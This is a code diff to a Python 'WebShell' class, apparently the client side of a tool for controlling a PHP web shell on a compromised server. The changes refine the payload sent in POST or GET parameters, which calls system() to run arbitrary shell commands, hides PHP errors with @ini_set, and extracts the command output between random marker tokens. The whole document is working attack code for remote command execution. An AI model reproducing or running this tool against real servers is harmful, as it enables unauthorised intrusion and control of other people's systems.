@@ -39,6 +39,7 @@ class WebShell():
             Log.error("Unsupported method!")
             return False
         content = response.content
+        Log.info(content)
         return value in content
 
     def check_connection(self, url):
@@ -95,16 +96,16 @@ class WebShell():
         tick = random_string(3, string.letters)
         token = random_string(32, string.letters)
         if self.method == "POST":
-            data = {self.password:"echo '"+token+"';system($_POST["+tick+"]);", tick:command + " 2>&1"}
+            data = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';system($_POST["+tick+"]);echo '"+token+"';", tick:command + " 2>&1"}
             response = requests.post(self.url, data=data)
         elif self.method == "GET":
-            params = {self.password:"echo '"+token+"';system($_GET["+tick+"]);", tick:command + " 2>&1"}
+            params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';system($_GET["+tick+"]);echo '"+token+"';", tick:command + " 2>&1"}
             response = requests.get(self.url, params=params)
         else:
             return (False, "Unsupported method!")
         content = response.text
         if token in content:
-            return (True, content.replace(token, ""))
+            return (True, content.split(token)[1])
         else:
             return (False, content)
 
